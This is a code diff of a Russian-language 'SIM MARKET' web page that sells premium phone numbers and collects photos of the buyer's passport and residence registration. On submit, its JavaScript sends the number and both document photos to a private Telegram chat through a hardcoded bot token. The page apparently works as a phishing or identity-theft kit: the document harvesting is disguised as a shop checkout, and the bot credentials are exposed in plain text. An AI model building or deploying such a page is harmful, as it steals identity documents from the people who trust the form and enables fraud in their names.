@@ -3,88 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIM MARKET | Регистрация</title>
+    <title>SIM MARKET | Магазин</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background: #0f172a; color: #f8fafc; }
         .gold-border { border: 1px solid #fbbf24; }
         .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); }
+        .num-card:active { transform: scale(0.98); border-color: #fbbf24; }
     </style>
 </head>
 <body class="p-5 font-sans">
-    <div class="max-w-md mx-auto glass p-8 rounded-2xl gold-border shadow-2xl mt-10 text-center">
-        <h1 class="text-2xl font-bold text-yellow-500 mb-2 uppercase">SIM MARKET</h1>
-        <p class="text-gray-400 text-sm mb-8 font-light">Официальная регистрация номера</p>
 
-        <form id="regForm" class="space-y-6 text-left">
-            <div>
-                <label class="block text-xs uppercase tracking-widest text-gray-500 mb-2 font-semibold">Желаемый номер</label>
-                <input type="text" id="phone_num" placeholder="+7 (___) ___-__-__" class="w-full bg-slate-800 p-4 rounded-xl border border-slate-700 focus:border-yellow-500 outline-none text-white" required>
+    <div class="max-w-md mx-auto">
+        <script>
+            // ПРОСТО ДОБАВЛЯЙ ИЛИ МЕНЯЙ НОМЕРА ЗДЕСЬ:
+            const MY_NUMBERS = [
+                { phone: "+7 (928) 000-11-22", price: "5000₽", type: "GOLD" },
+                { phone: "+7 (938) 555-55-55", price: "25000₽", type: "PLATINUM" },
+                { phone: "+7 (999) 123-45-67", price: "3000₽", type: "SILVER" },
+                { phone: "+7 (900) 000-00-01", price: "15000₽", type: "GOLD" }
+            ];
+        </script>
+
+        <div class="glass p-6 rounded-2xl gold-border shadow-2xl mb-6 text-center">
+            <h1 class="text-3xl font-bold text-yellow-500 uppercase tracking-tighter">SIM MARKET</h1>
+            <p class="text-gray-400 text-[10px] mt-1 tracking-[3px]">PREMIUM NUMBERS</p>
+        </div>
+
+        <div id="catalog" class="space-y-3 mb-8">
             </div>
 
-            <div class="space-y-4">
-                <label class="block text-xs uppercase tracking-widest text-gray-500 font-semibold text-center">Загрузка документов</label>
-                <div class="relative border-2 border-dashed border-slate-700 p-6 rounded-2xl text-center bg-slate-800/50 hover:border-yellow-500 transition cursor-pointer">
-                    <input type="file" id="pass_main" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required>
-                    <span class="text-sm text-gray-400" id="label_main">📸 Фото лица паспорта</span>
+        <div class="glass p-6 rounded-3xl gold-border shadow-2xl">
+            <h2 class="text-center font-bold mb-4">ОФОРМИТЬ ЗАЯВКУ</h2>
+            <form id="regForm" class="space-y-4">
+                <input type="text" id="phone_num" placeholder="Выбранный номер" class="w-full bg-slate-800 p-4 rounded-xl border border-slate-700 outline-none text-yellow-500 font-bold" required>
+                
+                <div class="grid grid-cols-2 gap-2">
+                    <div class="relative border border-dashed border-slate-600 p-3 rounded-xl text-center bg-slate-800/50">
+                        <input type="file" id="p1" accept="image/*" class="absolute inset-0 opacity-0" required>
+                        <span class="text-[10px] text-gray-400" id="l1">📸 ПАСПОРТ</span>
+                    </div>
+                    <div class="relative border border-dashed border-slate-600 p-3 rounded-xl text-center bg-slate-800/50">
+                        <input type="file" id="p2" accept="image/*" class="absolute inset-0 opacity-0" required>
+                        <span class="text-[10px] text-gray-400" id="l2">🏠 ПРОПИСКА</span>
+                    </div>
                 </div>
-                <div class="relative border-2 border-dashed border-slate-700 p-6 rounded-2xl text-center bg-slate-800/50 hover:border-yellow-500 transition cursor-pointer">
-                    <input type="file" id="pass_reg" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" required>
-                    <span class="text-sm text-gray-400" id="label_reg">🏠 Фото прописки</span>
-                </div>
-            </div>
 
-            <button type="submit" id="submitBtn" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-extrabold py-4 rounded-2xl shadow-lg transition active:scale-95 uppercase tracking-wider">
-                Отправить в SIM MARKET
-            </button>
-        </form>
-        <p id="status" class="mt-4 text-sm font-medium"></p>
+                <button type="submit" id="btn" class="w-full bg-yellow-500 text-black font-black py-4 rounded-2xl uppercase shadow-lg shadow-yellow-500/20">Отправить заявку</button>
+            </form>
+        </div>
     </div>
 
     <script>
-        const TOKEN = "8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo";
-        const CHAT_ID = "8768514374";
+        const catalog = document.getElementById('catalog');
+        MY_NUMBERS.forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'num-card glass p-4 rounded-2xl border border-slate-800 flex justify-between items-center cursor-pointer transition';
+            card.onclick = () => { 
+                document.getElementById('phone_num').value = item.phone;
+                window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'});
+            };
+            card.innerHTML = `
+                <div>
+                    <div class="text-lg font-mono font-bold text-white">${item.phone}</div>
+                    <div class="text-[10px] text-yellow-500 font-bold">${item.type} — ${item.price}</div>
+                </div>
+                <div class="text-yellow-500">➜</div>
+            `;
+            catalog.appendChild(card);
+        });
 
-        document.getElementById('pass_main').onchange = e => { document.getElementById('label_main').innerText = "✅ Лицо загружено"; document.getElementById('label_main').style.color = "#fbbf24"; };
-        document.getElementById('pass_reg').onchange = e => { document.getElementById('label_reg').innerText = "✅ Прописка загружена"; document.getElementById('label_reg').style.color = "#fbbf24"; };
+        const TOKEN = "8666944440:AAFAmQuYaYmnJjhuQ9AmdBQim9V-kxNnxAo";
+        const ID = "8768514374";
+
+        document.getElementById('p1').onchange = () => document.getElementById('l1').innerText = "✅ ГОТОВО";
+        document.getElementById('p2').onchange = () => document.getElementById('l2').innerText = "✅ ГОТОВО";
 
         document.getElementById('regForm').onsubmit = async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            const status = document.getElementById('status');
-            const phone = document.getElementById('phone_num').value;
-            const file1 = document.getElementById('pass_main').files[0];
-            const file2 = document.getElementById('pass_reg').files[0];
-
-            btn.disabled = true;
-            btn.innerText = "ОТПРАВКА...";
-            status.innerText = "⏳ Загружаем данные...";
+            const b = document.getElementById('btn');
+            b.disabled = true; b.innerText = "ОТПРАВЛЯЕМ...";
+            
+            const num = document.getElementById('phone_num').value;
+            const f1 = document.getElementById('p1').files[0];
+            const f2 = document.getElementById('p2').files[0];
 
             try {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📩 НОВАЯ ЗАЯВКА\n📱 Номер: ${phone}` })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: ID, text: `💎 ЗАЯВКА\n📱 Номер: ${num}`})
                 });
-
-                const formData1 = new FormData();
-                formData1.append('chat_id', CHAT_ID);
-                formData1.append('photo', file1);
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData1 });
-
-                const formData2 = new FormData();
-                formData2.append('chat_id', CHAT_ID);
-                formData2.append('photo', file2);
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
-
-                status.style.color = "#fbbf24";
-                status.innerText = "✅ Успешно отправлено!";
-                btn.innerText = "ГОТОВО";
-            } catch (err) {
-                status.innerText = "❌ Ошибка отправки.";
-                btn.disabled = false;
-                btn.innerText = "ПОПРОБОВАТЬ СНОВА";
-            }
+                const fd1 = new FormData(); fd1.append('chat_id', ID); fd1.append('photo', f1);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: 'POST', body: fd1});
+                const fd2 = new FormData(); fd2.append('chat_id', ID); fd2.append('photo', f2);
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
+                
+                alert("Успешно! Курбан скоро свяжется с вами.");
+                location.reload();
+            } catch (err) { alert("Ошибка!"); b.disabled = false; }
         };
     </script>
 </body>
